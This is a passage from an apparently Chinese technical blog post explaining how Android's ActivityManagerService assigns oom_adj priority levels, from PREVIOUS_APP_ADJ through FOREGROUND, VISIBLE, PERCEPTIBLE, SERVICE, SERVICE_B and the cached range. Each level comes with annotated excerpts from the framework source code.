ProcessList.PREVIOUS_APP_ADJ) &#123;</span><br><span class="line">        adj = ProcessList.PREVIOUS_APP_ADJ;</span><br><span class="line">        schedGroup = ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line">        app.cached = <span class="literal">false</span>;</span><br><span class="line">        app.adjType = <span class="string">&quot;previous&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_LAST_ACTIVITY) &#123;</span><br><span class="line">        procState = ActivityManager.PROCESS_STATE_LAST_ACTIVITY;</span><br><span class="line">        app.adjType = <span class="string">&quot;previous&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>场景 2： 当 provider 进程，上一次使用时间不超过 20S 的情况下，优先级不低于 PREVIOUS_APP_ADJ。provider 进程这个是 Android 7.0 以后新增的逻辑 ，这样做的好处是在内存比较低的情况下避免拥有 provider 的进程出现颠簸，也就是启动后杀，然后又被拉。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (app.lastProviderTime &gt; <span class="number">0</span> &amp;&amp;</span><br><span class="line">        (app.lastProviderTime+mConstants.CONTENT_PROVIDER_RETAIN_TIME) &gt; now) &#123;</span><br><span class="line">    <span class="keyword">if</span> (adj &gt; ProcessList.PREVIOUS_APP_ADJ) &#123;</span><br><span class="line">        adj = ProcessList.PREVIOUS_APP_ADJ;</span><br><span class="line">        schedGroup = ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line">        app.cached = <span class="literal">false</span>;</span><br><span class="line">        app.adjType = <span class="string">&quot;recent-provider&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_LAST_ACTIVITY) &#123;</span><br><span class="line">        procState = ActivityManager.PROCESS_STATE_LAST_ACTIVITY;</span><br><span class="line">        app.adjType = <span class="string">&quot;recent-provider&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-foreground_app_adj0"><a class="markdownIt-Anchor" href="#2-foreground_app_adj0">#</a> 2. FOREGROUND_APP_ADJ(0)</h2><p>场景 1：满足以下任一条件的进程都属于 FOREGROUND_APP_ADJ (0) 优先级：</p><ul><li><p>正处于 resumed 状态的 Activity</p></li><li><p>正执行一个生命周期回调的 Service（比如执行 onCreate,onStartCommand,onDestroy 等）</p></li><li><p>正执行 onReceive () 的 BroadcastReceiver</p></li><li><p>通过 startInstrumentation () 启动的进程</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (PROCESS_STATE_CUR_TOP == ActivityManager.PROCESS_STATE_TOP &amp;&amp; app == TOP_APP) &#123;</span><br><span class="line">    adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">    schedGroup = ProcessList.SCHED_GROUP_TOP_APP;</span><br><span class="line">    app.adjType = <span class="string">&quot;top-activity&quot;</span>;</span><br><span class="line">    foregroundActivities = <span class="literal">true</span>;</span><br><span class="line">    procState = PROCESS_STATE_CUR_TOP;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (app.instr != null) &#123;</span><br><span class="line">    adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">    schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">    app.adjType = <span class="string">&quot;instrumentation&quot;</span>;</span><br><span class="line">    procState = ActivityManager.PROCESS_STATE_FOREGROUND_SERVICE;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (isReceivingBroadcastLocked(app, mTmpBroadcastQueue)) &#123;</span><br><span class="line">    adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">    schedGroup = (mTmpBroadcastQueue.contains(mFgBroadcastQueue))</span><br><span class="line">            ? ProcessList.SCHED_GROUP_DEFAULT : ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line">    app.adjType = <span class="string">&quot;broadcast&quot;</span>;</span><br><span class="line">    procState = ActivityManager.PROCESS_STATE_RECEIVER;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (app.executingServices.size() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">    schedGroup = app.execServicesFg ?</span><br><span class="line">            ProcessList.SCHED_GROUP_DEFAULT : ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line">    app.adjType = <span class="string">&quot;exec-service&quot;</span>;</span><br><span class="line">    procState = ActivityManager.PROCESS_STATE_SERVICE;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (app == TOP_APP) &#123;</span><br><span class="line">    adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">    schedGroup = ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line">    app.adjType = <span class="string">&quot;top-sleeping&quot;</span>;</span><br><span class="line">    foregroundActivities = <span class="literal">true</span>;</span><br><span class="line">    procState = PROCESS_STATE_CUR_TOP;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    schedGroup = ProcessList.SCHED_GROUP_BACKGROUND;</span><br><span class="line">    adj = cachedAdj;</span><br><span class="line">    procState = ActivityManager.PROCESS_STATE_CACHED_EMPTY;</span><br><span class="line">    app.cached = <span class="literal">true</span>;</span><br><span class="line">    app.empty = <span class="literal">true</span>;</span><br><span class="line">    app.adjType = <span class="string">&quot;cch-empty&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>场景 2： 当客户端进程 activity 里面调用 bindService () 方法时 flags 带有 BIND_ADJUST_WITH_ACTIVITY 参数，并且该 activity 处于可见状态，则当前服务进程也属于前台进程，源码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> is = app.services.size()<span class="number">-1</span>; is &gt;= <span class="number">0</span>; is--) &#123;</span><br><span class="line">    ServiceRecord s = app.services.valueAt(is);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> conni = s.connections.size()<span class="number">-1</span>; conni &gt;= <span class="number">0</span>; conni--) &#123;</span><br><span class="line">        ArrayList&lt;ConnectionRecord&gt; clist = s.connections.valueAt(conni);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; clist.size(); i++) &#123;</span><br><span class="line">            ConnectionRecord cr = clist.get(i);</span><br><span class="line">            <span class="keyword">if</span> ((cr.flags&amp;Context.BIND_WAIVE_PRIORITY) == <span class="number">0</span>) &#123;</span><br><span class="line">              ...</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            final ActivityRecord a = cr.activity;</span><br><span class="line">            <span class="keyword">if</span> ((cr.flags&amp;Context.BIND_ADJUST_WITH_ACTIVITY) != <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (a != null &amp;&amp; adj &gt; ProcessList.FOREGROUND_APP_ADJ &amp;&amp;</span><br><span class="line">                    (a.visible || a.state == ActivityState.RESUMED ||</span><br><span class="line">                     a.state == ActivityState.PAUSING)) &#123;</span><br><span class="line">                    adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">                    <span class="keyword">if</span> ((cr.flags&amp;Context.BIND_NOT_FOREGROUND) == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((cr.flags&amp;Context.BIND_IMPORTANT) != <span class="number">0</span>) &#123;</span><br><span class="line">                            schedGroup = ProcessList.SCHED_GROUP_TOP_APP_BOUND;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    app.cached = <span class="literal">false</span>;</span><br><span class="line">                    app.adjType = <span class="string">&quot;service&quot;</span>;</span><br><span class="line">                    app.adjTypeCode = ActivityManager.RunningAppProcessInfo</span><br><span class="line">                            .REASON_SERVICE_IN_USE;</span><br><span class="line">                    app.adjSource = a;</span><br><span class="line">                    app.adjSourceProcState = procState;</span><br><span class="line">                    app.adjTarget = s.name;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>场景 3： 对于 provider 客户端进程，还有以下两个条件能成为前台进程：</p><ul><li><p>当 Provider 的客户端进程 ADJ&lt;=FOREGROUND_APP_ADJ 时，则 Provider 进程 ADJ 等于 FOREGROUND_APP_ADJ</p></li><li><p>当 Provider 有外部 (非框架) 进程依赖，也就是调用了 getContentProviderExternal () 方法，则 ADJ 至少等于 FOREGROUND_APP_ADJ</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> provi = app.pubProviders.size()<span class="number">-1</span>; provi &gt;= <span class="number">0</span>; provi--) &#123;</span><br><span class="line">    ContentProviderRecord cpr = app.pubProviders.valueAt(provi);</span><br><span class="line">    <span class="comment">//根据client来调整provider进程的adj和procState</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = cpr.connections.size()<span class="number">-1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        ContentProviderConnection conn = cpr.connections.get(i);</span><br><span class="line">        ProcessRecord client = conn.client;</span><br><span class="line">        <span class="type">int</span> clientAdj = computeOomAdjLocked(client, cachedAdj, TOP_APP, doingAll, now);</span><br><span class="line">        <span class="keyword">if</span> (adj &gt; clientAdj) &#123;</span><br><span class="line">            <span class="keyword">if</span> (app.hasShownUi &amp;&amp; app != mHomeProcess</span><br><span class="line">                    &amp;&amp; clientAdj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) &#123;</span><br><span class="line">                ...</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                adj = clientAdj &gt; ProcessList.FOREGROUND_APP_ADJ</span><br><span class="line">                        ? clientAdj : ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">                adjType = <span class="string">&quot;provider&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            app.cached &amp;= client.cached;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//根据provider外部依赖情况来调整adj和schedGroup</span></span><br><span class="line">    <span class="keyword">if</span> (cpr.hasExternalProcessHandles()) &#123;</span><br><span class="line">         <span class="keyword">if</span> (adj &gt; ProcessList.FOREGROUND_APP_ADJ) &#123;</span><br><span class="line">             adj = ProcessList.FOREGROUND_APP_ADJ;</span><br><span class="line">             schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">             app.cached = <span class="literal">false</span>;</span><br><span class="line">             app.adjType = <span class="string">&quot;ext-provider&quot;</span>;</span><br><span class="line">             app.adjTarget = cpr.name;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-visible_app_adj100"><a class="markdownIt-Anchor" href="#3-visible_app_adj100">#</a> 3. VISIBLE_APP_ADJ(100)</h2><p>可见进程：当 ActivityRecord 的 visible=true，也就是 Activity 可见的进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!foregroundActivities &amp;&amp; activitiesSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">int</span> minLayer = ProcessList.VISIBLE_APP_LAYER_MAX;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; activitiesSize; j++) &#123;</span><br><span class="line">        final ActivityRecord r = app.activities.get(j);</span><br><span class="line">        <span class="keyword">if</span> (r.visible) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adj &gt; ProcessList.VISIBLE_APP_ADJ) &#123;</span><br><span class="line">                adj = ProcessList.VISIBLE_APP_ADJ;</span><br><span class="line">                app.adjType = <span class="string">&quot;vis-activity&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (procState &gt; PROCESS_STATE_CUR_TOP) &#123;</span><br><span class="line">                procState = PROCESS_STATE_CUR_TOP;</span><br><span class="line">                app.adjType = <span class="string">&quot;vis-activity&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">            app.cached = <span class="literal">false</span>;</span><br><span class="line">            app.empty = <span class="literal">false</span>;</span><br><span class="line">            foregroundActivities = <span class="literal">true</span>;</span><br><span class="line">            final TaskRecord task = r.getTask();</span><br><span class="line">            <span class="keyword">if</span> (task != null &amp;&amp; minLayer &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                final <span class="type">int</span> layer = task.mLayerRank;</span><br><span class="line">                <span class="keyword">if</span> (layer &gt;= <span class="number">0</span> &amp;&amp; minLayer &gt; layer) &#123;</span><br><span class="line">                    minLayer = layer;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (adj == ProcessList.VISIBLE_APP_ADJ) &#123;</span><br><span class="line">        adj += minLayer;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从 Android P 开始，进一步细化 ADJ 级别，增加了 VISIBLE_APP_LAYER_MAX (99)，是指 VISIBLE_APP_ADJ (100) 跟 PERCEPTIBLE_APP_ADJ (200) 之间有 99 个槽，则可见级别 ADJ 的取值范围为 [100,199]。 算法会根据其所在 task 的 mLayerRank 来调整其 ADJ，100 加上 mLayerRank 就等于目标 ADJ，layer 越大，则 ADJ 越小。</p><p>当 TaskRecord 顶部的 ActivityRecord 为空或者结束或者不可见时，则设置该 TaskRecord 的 mLayerRank 等于 - 1; 每个 ActivityDisplay 的 baseLayer 都是从 0 开始，从最上面的 TaskRecord 开始，第一个 ADJ=100，从上至下依次加 1，直到 199 为上限。</p><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202205092201897.png" alt="image-20220509220115658"></p><h2 id="4-perceptible_app_adj200"><a class="markdownIt-Anchor" href="#4-perceptible_app_adj200">#</a> 4. PERCEPTIBLE_APP_ADJ(200)</h2><p>可感知进程：当该进程存在不可见的 Activity，但 Activity 正处于 PAUSING、PAUSED、STOPPING 状态，则为 PERCEPTIBLE_APP_ADJ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!foregroundActivities &amp;&amp; activitiesSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="type">int</span> minLayer = ProcessList.VISIBLE_APP_LAYER_MAX;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; activitiesSize; j++) &#123;</span><br><span class="line">        final ActivityRecord r = app.activities.get(j);</span><br><span class="line">        <span class="keyword">if</span> (r.visible) &#123;</span><br><span class="line">            ...</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (r.state == ActivityState.PAUSING || r.state == ActivityState.PAUSED) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) &#123;</span><br><span class="line">                adj = ProcessList.PERCEPTIBLE_APP_ADJ;</span><br><span class="line">                app.adjType = <span class="string">&quot;pause-activity&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (procState &gt; PROCESS_STATE_CUR_TOP) &#123;</span><br><span class="line">                procState = PROCESS_STATE_CUR_TOP;</span><br><span class="line">                app.adjType = <span class="string">&quot;pause-activity&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            schedGroup = ProcessList.SCHED_GROUP_DEFAULT;</span><br><span class="line">            app.cached = <span class="literal">false</span>;</span><br><span class="line">            app.empty = <span class="literal">false</span>;</span><br><span class="line">            foregroundActivities = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (r.state == ActivityState.STOPPING) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adj &gt; ProcessList.PERCEPTIBLE_APP_ADJ) &#123;</span><br><span class="line">                adj = ProcessList.PERCEPTIBLE_APP_ADJ;</span><br><span class="line">                app.adjType = <span class="string">&quot;stop-activity&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (!r.finishing) &#123;</span><br><span class="line">                <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_LAST_ACTIVITY) &#123;</span><br><span class="line">                    procState = ActivityManager.PROCESS_STATE_LAST_ACTIVITY;</span><br><span class="line">                    app.adjType = <span class="string">&quot;stop-activity&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            app.cached = <span class="literal">false</span>;</span><br><span class="line">            app.empty = <span class="literal">false</span>;</span><br><span class="line">            foregroundActivities = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>满足以下任一条件的进程也属于可感知进程:</p><ul><li><p>foregroundServices 非空：前台服务进程，执行 startForegroundService () 方法</p></li><li><p>app.forcingToImportant 非空：执行 setProcessImportant () 方法，比如 Toast 弹出过程。</p></li><li><p>hasOverlayUi 非空：非 activity 的 UI 位于屏幕最顶层，比如显示类型 TYPE_APPLICATION_OVERLAY 的窗口</p></li></ul><h2 id="5-service_adj500"><a class="markdownIt-Anchor" href="#5-service_adj500">#</a> 5. SERVICE_ADJ(500)</h2><p>服务进程：没有启动过 Activity，并且 30 分钟之内活跃过的服务进程。 startRequested 为 true，则代表执行 startService () 且没有 stop 的进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> is = app.services.size()<span class="number">-1</span>; is &gt;= <span class="number">0</span>; is--) &#123;</span><br><span class="line">    ServiceRecord s = app.services.valueAt(is);</span><br><span class="line">    <span class="keyword">if</span> (s.startRequested) &#123;</span><br><span class="line">        app.hasStartedServices = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (procState &gt; ActivityManager.PROCESS_STATE_SERVICE) &#123;</span><br><span class="line">            procState = ActivityManager.PROCESS_STATE_SERVICE;</span><br><span class="line">            app.adjType = <span class="string">&quot;started-services&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (app.hasShownUi &amp;&amp; app != mHomeProcess) &#123;</span><br><span class="line">            <span class="keyword">if</span> (adj &gt; ProcessList.SERVICE_ADJ) &#123;</span><br><span class="line">                app.adjType = <span class="string">&quot;cch-started-ui-services&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (now &lt; (s.lastActivity + mConstants.MAX_SERVICE_INACTIVITY)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (adj &gt; ProcessList.SERVICE_ADJ) &#123;</span><br><span class="line">                    adj = ProcessList.SERVICE_ADJ;</span><br><span class="line">                    app.adjType = <span class="string">&quot;started-services&quot;</span>;</span><br><span class="line">                    app.cached = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> conni = s.connections.size()<span class="number">-1</span>; conni &gt;= <span class="number">0</span>; conni--) &#123;</span><br><span class="line">        ... <span class="comment">//根据client情况来调整adj</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-service_b_adj800"><a class="markdownIt-Anchor" href="#6-service_b_adj800">#</a> 6. SERVICE_B_ADJ(800)</h3><p>进程由 SERVICE_ADJ (500) 降低到 SERVICE_B_ADJ (800)，有以下两种情况：</p><ul><li><p>A 类 Service 占比过高：当 A 类 Service 个数 &gt; Service 总数的 1/3 时，则加入到 B 类 Service。换句话说，B Service 的个数至少是 A Service 的 2 倍。</p></li><li><p>内存紧张并且 A 类 Service 占用内存较高：当系统内存紧张级别 (mLastMemoryLevel) 高于 ADJ_MEM_FACTOR_NORMAL，且该应用所占内存 lastPss 大于或等于 CACHED_APP_MAX_ADJ 级别所对应的内存阈值的 1/3（默认值阈值约等于 110MB）。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (adj == ProcessList.SERVICE_ADJ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (doingAll) &#123;</span><br><span class="line">        app.serviceb = mNewNumAServiceProcs &gt; (mNumServiceProcs/<span class="number">3</span>);</span><br><span class="line">        mNewNumServiceProcs++;</span><br><span class="line">        <span class="keyword">if</span> (!app.serviceb) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mLastMemoryLevel &gt; ProcessStats.ADJ_MEM_FACTOR_NORMAL</span><br><span class="line">                    &amp;&amp; app.lastPss &gt;= mProcessList.getCachedRestoreThresholdKb()) &#123;</span><br><span class="line">                app.serviceHighRam = <span class="literal">true</span>;</span><br><span class="line">                app.serviceb = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mNewNumAServiceProcs++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            app.serviceHighRam = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (app.serviceb) &#123;</span><br><span class="line">        adj = ProcessList.SERVICE_B_ADJ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-cached_app_min_adj900"><a class="markdownIt-Anchor" href="#7-cached_app_min_adj900">#</a> 7. CACHED_APP_MIN_ADJ(900)</h3><p>缓存进程优先级从 CACHED_APP_MIN_ADJ (900) 到 CACHED_APP_MAX_ADJ (906)。</p><p>ADJ 的转换算法：</p><ul><li>cached: 900, 901, 903, 905</li><li>empty: 900, 902, 904, 906</li></ul><p><img src="https://raw.githubusercontent.com/y1seco/blog_image/master/img/202205092213631.png" alt="image-20220509221346179"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">final <span class="type">int</span> N = mLruProcesses.size();</span><br><span class="line"><span class="comment">//numSlots等于3</span></span><br><span class="line"><span class="type">int</span> numSlots = (ProcessList.CACHED_APP_MAX_ADJ</span><br><span class="line">        - ProcessList.CACHED_APP_MIN_ADJ + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line"><span class="comment">//mNumNonCachedProcs是指empty和cached之外的进程， mNumCachedHiddenProcs代表的是cached进程个数</span></span><br><span class="line"><span class="type">int</span> numEmptyProcs = N - mNumNonCachedProcs - mNumCachedHiddenProcs;</span><br><span class="line"><span class="keyword">if</span> (numEmptyProcs &gt; cachedProcessLimit) &#123;</span><br><span class="line">    numEmptyProcs = cachedProcessLimit;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//emptyFactor和cachedFactor分别代表每个slot里面包括的进程个数，大于或等于1</span></span><br><span class="line"><span class="type">int</span> emptyFactor = numEmptyProcs/numSlots;</span><br><span class="line"><span class="type">int</span> cachedFactor = (mNumCachedHiddenProcs &gt; <span class="number">0</span> ? mNumCachedHiddenProcs : <span class="number">1</span>)/numSlots;</span><br><span class="line">                    app.curRawAdj = curEmptyAdj;</span><br><span class="line">                    ...</span><br><span class="line">                    <span class="comment">//ADJ阈值</span></span><br><span class="line">                    app.curAdj = app.modifyRawOomAdj(curEmptyAdj);</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span 